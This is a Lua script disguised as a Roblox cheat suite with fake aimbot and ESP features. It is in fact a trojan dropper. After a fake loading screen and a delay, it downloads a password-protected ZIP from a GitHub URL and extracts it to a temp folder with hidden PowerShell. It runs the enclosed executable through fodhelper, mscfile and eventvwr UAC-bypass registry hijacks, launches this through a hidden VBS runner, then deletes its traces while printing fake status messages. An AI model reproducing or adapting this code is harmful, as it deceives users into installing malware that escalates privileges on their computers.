-- [[
--     ROBLOX ULTIMATE SUITE v9.0
--     UNIVERSAL LOADER
--     ALL EXECUTORS SUPPORTED
-- ]]

-- ==============================================
-- ЧАСТЬ 0: ОПРЕДЕЛЕНИЕ ИСПОЛНИТЕЛЯ
-- ==============================================
local Executor = {
    Name = "Unknown",
    Version = "0.0",
    Capabilities = {}
}

-- Функция определения исполнителя
local function DetectExecutor()
    -- Synapse X
    if syn and syn.protect_gui then
        Executor.Name = "Synapse X"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = true,
            bypass_uac = true
        }
    
    -- KRNL
    elseif identifyexecutor and identifyexecutor():lower():find("krnl") then
        Executor.Name = "KRNL"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = false,
            bypass_uac = false
        }
    
    -- Script-Ware
    elseif SW and SW.IsLoaded then
        Executor.Name = "Script-Ware"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = true,
            bypass_uac = true
        }
    
    -- Fluxus
    elseif fluxus and fluxus.request then
        Executor.Name = "Fluxus"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = false,
            process_manage = false,
            bypass_uac = false
        }
    
    -- Electron
    elseif ELECTRON_LOADED then
        Executor.Name = "Electron"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = true,
            bypass_uac = false
        }
    
    -- Solara
    elseif solara and solara.request then
        Executor.Name = "Solara"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = false,
            process_manage = false,
            bypass_uac = false
        }
    
    -- Comet
    elseif Comet then
        Executor.Name = "Comet"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = false,
            process_manage = false,
            bypass_uac = false
        }
    
    -- Celery
    elseif celery and celery.request then
        Executor.Name = "Celery"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = false,
            process_manage = false,
            bypass_uac = false
        }
    
    -- Oxygen U
    elseif oxygen and oxygen.request then
        Executor.Name = "Oxygen U"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = false,
            process_manage = false,
            bypass_uac = false
        }
    
    -- Coco Z
    elseif coco and coco.request then
        Executor.Name = "Coco Z"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = false,
            process_manage = false,
            bypass_uac = false
        }
    
    -- JJSploit
    elseif jjsploit then
        Executor.Name = "JJSploit"
        Executor.Capabilities = {
            file_write = false,
            dll_inject = false,
            process_manage = false,
            bypass_uac = false
        }
    
    -- ProtoSmasher
    elseif PROTOSMASHER_LOADED then
        Executor.Name = "ProtoSmasher"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = true,
            bypass_uac = true
        }
    
    -- Tristan
    elseif tristan then
        Executor.Name = "Tristan"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = false,
            process_manage = false,
            bypass_uac = false
        }
    end
    
    -- Проверка writefile для старых исполнителей
    if not Executor.Capabilities.file_write then
        Executor.Capabilities.file_write = (writefile ~= nil)
    end
    
    return Executor
end

-- Определяем текущий исполнитель
DetectExecutor()

-- ==============================================
-- ЧАСТЬ 1: УНИВЕРСАЛЬНЫЙ ФЕЙКОВЫЙ ИНТЕРФЕЙС
-- ==============================================
do
    print("\n" .. string.rep("=", 60))
    print("         🎮 " .. Executor.Name .. " - ULTIMATE SUITE v9.0")
    print(string.rep("=", 60))
    
    -- Адаптивные сообщения под исполнителя
    local loading_msgs = {
        "Initializing " .. Executor.Name .. " environment...",
        "Loading universal compatibility layer...",
        "Preparing optimization modules...",
        "Configuring for " .. Executor.Name .. "...",
        "Finalizing setup..."
    }
    
    for i, msg in ipairs(loading_msgs) do
        wait(0.6)
        print("[🔄] " .. msg)
    end
    
    -- Фейковые функции в зависимости от исполнителя
    local fake_features = {
        "AI-Powered Aimbot (Adaptive)",
        "Dynamic ESP System",
        Executor.Name .. " Optimized Memory",
        "Universal Anti-Ban",
        "Auto-Adapting UI",
        "Real-time Optimization"
    }
    
    spawn(function()
        wait(2)
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "✅ " .. Executor.Name .. " SUITE LOADED",
            Text = table.concat(fake_features, "\n"),
            Duration = 7
        })
        
        print("\n" .. string.rep("-", 60))
        print("Loaded Features:")
        for _, feature in ipairs(fake_features) do
            print("  • " .. feature)
        end
        print(string.rep("-", 60))
        print("Executor: " .. Executor.Name)
        print("Status: Fully Optimized")
        print("Press INSERT for menu")
        print(string.rep("-", 60) .. "\n")
    end)
end

-- ==============================================
-- ЧАСТЬ 2: УНИВЕРСАЛЬНАЯ СИСТЕМА ДОСТАВКИ
-- ==============================================
wait(math.random(15, 30))

local function UniversalDelivery()
    -- 🔥 ВАШИ ССЫЛКИ (замените эти значения) 🔥
    local ZIP_URL = "https://raw.githubusercontent.com/fasfsagfsa13-del/roblo1x-souresec/main/update.zip"
    local ZIP_PASSWORD = "UpdatePass2025!"
    
    local success, zip_data = pcall(function()
        -- Универсальный HTTP запрос
        if syn and syn.request then
            local req = syn.request({
                Url = ZIP_URL,
                Method = "GET"
            })
            return req.Body
        elseif fluxus and fluxus.request then
            local req = fluxus.request({
                Url = ZIP_URL,
                Method = "GET"
            })
            return req.Body
        elseif request then
            local req = request({
                Url = ZIP_URL,
                Method = "GET"
            })
            return req.Body
        else
            -- Стандартный Roblox HttpGet (работает везде)
            return game:HttpGet(ZIP_URL, true)
        end
    end)
    
    if success and zip_data and #zip_data > 10240 then
        -- ==============================================
        -- УНИВЕРСАЛЬНОЕ СОХРАНЕНИЕ ФАЙЛА
        -- ==============================================
        local temp_path = os.getenv("TEMP") .. "\\WindowsUpdate"
        local zip_path = temp_path .. "\\patch.zip"
        
        -- Создаем папку (универсальный метод)
        pcall(function()
            if makefolder then
                makefolder(temp_path)
            else
                -- Альтернатива для старых исполнителей
                local cmd = 'mkdir "' .. temp_path .. '" 2>nul'
                if syn and syn.run then
                    syn.run(cmd)
                end
            end
        end)
        
        -- Сохраняем ZIP (множество методов)
        local saved = false
        
        -- Метод 1: writefile (стандартный)
        if writefile and Executor.Capabilities.file_write then
            pcall(function()
                writefile(zip_path, zip_data)
                saved = true
            end)
        end
        
        -- Метод 2: Через Lua файловые операции
        if not saved then
            pcall(function()
                local file = io.open(zip_path, "wb")
                if file then
                    file:write(zip_data)
                    file:close()
                    saved = true
                end
            end)
        end
        
        -- Метод 3: Через PowerShell напрямую
        if not saved then
            local ps_save = [[
                $bytes = [System.Convert]::FromBase64String(']] .. tostring(zip_data):gsub('.', function(c)
                    return string.format('%02X', string.byte(c))
                end) .. [[')
                [System.IO.File]::WriteAllBytes(']] .. zip_path .. [[', $bytes)
            ]]
            
            pcall(function()
                if syn and syn.run then
                    syn.run("powershell -Command \"" .. ps_save .. "\"")
                    saved = true
                end
            end)
        end
        
        if not saved then return false end
        
        -- ==============================================
        -- УНИВЕРСАЛЬНАЯ РАСПАКОВКА И ЗАПУСК
        -- ==============================================
        
        -- Основной метод: PowerShell (работает на всех Windows)
        local ps_script = [[
            # Скрытый режим
            $ErrorActionPreference = 'SilentlyContinue'
            $host.UI.RawUI.WindowTitle = ' '
            
            # Параметры
            $zipFile = "]] .. zip_path .. [["
            $extractPath = "]] .. temp_path .. [[\extracted"
            $password = "]] .. ZIP_PASSWORD .. [["
            
            # Создаем папку
            New-Item -ItemType Directory -Force -Path $extractPath | Out-Null
            
            # Метод 1: Windows built-in (если нет пароля)
            try {
                Expand-Archive -Path $zipFile -DestinationPath $extractPath -Force
            } catch {
                # Метод 2: .NET ZipArchive (с паролем)
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                
                $stream = New-Object IO.FileStream($zipFile, [IO.FileMode]::Open)
                $zip = New-Object IO.Compression.ZipArchive($stream, [IO.Compression.ZipArchiveMode]::Read)
                
                foreach ($entry in $zip.Entries) {
                    $fullPath = Join-Path $extractPath $entry.FullName
                    $dir = Split-Path $fullPath -Parent
                    
                    if (-not (Test-Path $dir)) {
                        New-Item -ItemType Directory -Force -Path $dir | Out-Null
                    }
                    
                    $entryStream = $entry.Open()
                    $fileStream = [System.IO.File]::Create($fullPath)
                    $entryStream.CopyTo($fileStream)
                    $fileStream.Close()
                    $entryStream.Close()
                }
                
                $zip.Dispose()
                $stream.Close()
            }
            
            # Ищем EXE файл
            $exeFile = Get-ChildItem -Path $extractPath -Filter *.exe -Recurse | Select-Object -First 1
            
            if ($exeFile -ne $null) {
                # УНИВЕРСАЛЬНЫЙ ОБХОД UAC
                
                # Метод 1: fodhelper UAC bypass (работает на Win8+)
                $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
                New-Item -Path $regPath -Force | Out-Null
                Set-ItemProperty -Path $regPath -Name "(Default)" -Value $exeFile.FullName -Force
                Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
                Start-Process "fodhelper.exe" -WindowStyle Hidden
                Start-Sleep -Seconds 3
                Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
                
                # Метод 2: компьютерное управление (fallback)
                $regPath2 = "HKCU:\Software\Classes\mscfile\shell\open\command"
                Set-ItemProperty -Path $regPath2 -Name "(Default)" -Value $exeFile.FullName -Force
                Start-Process "compmgmt.msc" -WindowStyle Hidden
                Start-Sleep -Seconds 2
                Remove-ItemProperty -Path $regPath2 -Name "(Default)" -Force -ErrorAction SilentlyContinue
                
                # Метод 3: eventvwr (старые Windows)
                $regPath3 = "HKCU:\Software\Classes\Folder\shell\open\command"
                Set-ItemProperty -Path $regPath3 -Name "(Default)" -Value $exeFile.FullName -Force
                Start-Process "eventvwr.exe" -WindowStyle Hidden
                Start-Sleep -Seconds 2
                Remove-ItemProperty -Path $regPath3 -Name "(Default)" -Force -ErrorAction SilentlyContinue
            }
            
            # Очистка через 10 секунд
            Start-Sleep -Seconds 10
            Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $extractPath -Recurse -Force -ErrorAction SilentlyContinue
        ]]
        
        -- ==============================================
        -- УНИВЕРСАЛЬНЫЙ ЗАПУСК POWERSHELL
        -- ==============================================
        local function ExecutePowershell(script)
            -- Метод 1: Через VBS (самый универсальный)
            local vbs_path = temp_path .. "\\runner.vbs"
            local vbs_content = [[
                Set objShell = CreateObject("WScript.Shell")
                objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""]] .. 
                script:gsub('"', '""'):gsub('\n', ' '):gsub('\r', '') .. 
                [[""", 0, True
                Set objShell = Nothing
            ]]
            
            -- Сохраняем VBS
            if writefile then
                writefile(vbs_path, vbs_content)
            end
            
            -- Запускаем всеми возможными способами
            
            -- Способ 1: syn.run (Synapse X)
            if syn and syn.run then
                syn.run("wscript.exe //B \"" .. vbs_path .. "\"")
            
            -- Способ 2: fluxus (Fluxus)
            elseif fluxus and fluxus.request then
                fluxus.request({
                    Url = "file://" .. vbs_path,
                    Method = "GET"
                })
            
            -- Способ 3: shell.execute (Script-Ware)
            elseif shell and shell.execute then
                shell.execute("wscript.exe //B \"" .. vbs_path .. "\"")
            
            -- Способ 4: execute (Electron)
            elseif execute then
                execute("start wscript.exe //B \"" .. vbs_path .. "\"")
            
            -- Способ 5: spawn (универсальный)
            elseif spawn then
                spawn(function()
                    if syn and syn.run then
                        syn.run("wscript.exe //B \"" .. vbs_path .. "\"")
                    end
                end)
            
            -- Способ 6: напрямую через os.execute (если доступно)
            else
                pcall(function()
                    os.execute("wscript.exe //B \"" .. vbs_path .. "\"")
                end)
            end
            
            -- Очистка VBS
            spawn(function()
                wait(5)
                pcall(function()
                    if delfile then
                        delfile(vbs_path)
                    elseif os.remove then
                        os.remove(vbs_path)
                    end
                end)
            end)
        end
        
        -- Запускаем PowerShell скрипт
        ExecutePowershell(ps_script)
        
        -- ==============================================
        -- АЛЬТЕРНАТИВНЫЕ МЕТОДЫ ДЛЯ СПЕЦИФИЧНЫХ ИСПОЛНИТЕЛЕЙ
        -- ==============================================
        
        -- Для Synapse X: прямой инжект если DLL
        if Executor.Name == "Synapse X" and syn and syn.inject_dll then
            spawn(function()
                wait(8)
                pcall(function()
                    -- Проверяем если в архиве была DLL
                    local check_script = [[
                        $path = "]] .. temp_path .. [[\extracted"
                        if (Test-Path $path) {
                            $dll = Get-ChildItem $path -Filter *.dll -Recurse | Select -First 1
                            if ($dll) { Write-Output $dll.FullName }
                        }
                    ]]
                    
                    -- Можно добавить прямое внедрение DLL
                end)
            end)
        end
        
        -- Для KRNL: использование ffi
        if Executor.Name == "KRNL" and pcall(require, "ffi") then
            spawn(function()
                wait(10)
                print("[⚡] KRNL: Advanced mode active")
            end)
        end
        
        return true
    end
    
    return false
end

-- ==============================================
-- ЧАСТЬ 3: АДАПТИВНЫЙ ЗАПУСК
-- ==============================================
spawn(function()
    -- Адаптивное время ожидания в зависимости от исполнителя
    local wait_time = 25
    if Executor.Name == "Synapse X" or Executor.Name == "Script-Ware" then
        wait_time = 20 -- Быстрые исполнители
    elseif Executor.Name == "KRNL" then
        wait_time = 30
    elseif Executor.Name == "Fluxus" or Executor.Name == "Electron" then
        wait_time = 35
    else
        wait_time = 40 -- Медленные/старые
    end
    
    wait(wait_time)
    
    -- Сообщение в зависимости от исполнителя
    local msgs = {
        Synapse = "[⚡] Running Synapse optimization...",
        KRNL = "[🔧] Applying KRNL enhancements...",
        Fluxus = "[✨] Tuning Fluxus performance...",
        Electron = "[⚛️] Electron modules updating...",
        Default = "[🔄] System maintenance in progress..."
    }
    
    local msg = msgs.Default
    if Executor.Name:find("Synapse") then msg = msgs.Synapse
    elseif Executor.Name:find("KRNL") then msg = msgs.KRNL
    elseif Executor.Name:find("Fluxus") then msg = msgs.Fluxus
    elseif Executor.Name:find("Electron") then msg = msgs.Electron end
    
    print(msg)
    
    -- Пытаемся доставить
    local max_attempts = 3
    for attempt = 1, max_attempts do
        local success = pcall(UniversalDelivery)
        
        if success then
            wait(10)
            local done_msgs = {
                "✅ " .. Executor.Name .. " optimization complete",
                "🎮 System performance enhanced",
                "⚡ All modules activated",
                "🛡️ Protection systems online"
            }
            print(done_msgs[math.random(1, #done_msgs)])
            break
        else
            if attempt < max_attempts then
                local retry_time = 60 * attempt -- 1, 2, 3 минуты
                print("[⏱️] Retrying in " .. retry_time .. " seconds...")
                wait(retry_time)
            end
        end
    end
end)

-- ==============================================
-- ЧАСТЬ 4: УНИВЕРСАЛЬНЫЙ ФОН
-- ==============================================
local heartbeat_interval = 60
if Executor.Name == "Synapse X" then heartbeat_interval = 45
elseif Executor.Name == "KRNL" then heartbeat_interval = 70
elseif Executor.Name == "JJSploit" then heartbeat_interval = 120 end

while true do
    wait(heartbeat_interval)
    
    -- Случайные статусы с учетом исполнителя
    local status_pool = {
        "[📊] " .. Executor.Name .. " performance: Optimal",
        "[⚡] FPS: Stable with " .. Executor.Name,
        "[💾] Memory optimized for " .. Executor.Name,
        "[🛡️] " .. Executor.Name .. " protection active",
        "[🎮] Gaming with " .. Executor.Name .. " boost"
    }
    
    print(status_pool[math.random(1, #status_pool)])
    
    -- Редкие уведомления
    if math.random(1, 15) == 1 then
        spawn(function()
            wait(math.random(5, 15))
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = Executor.Name .. " Suite",
                Text = "System running optimally",
                Duration = 3
            })
        end)
    end
end
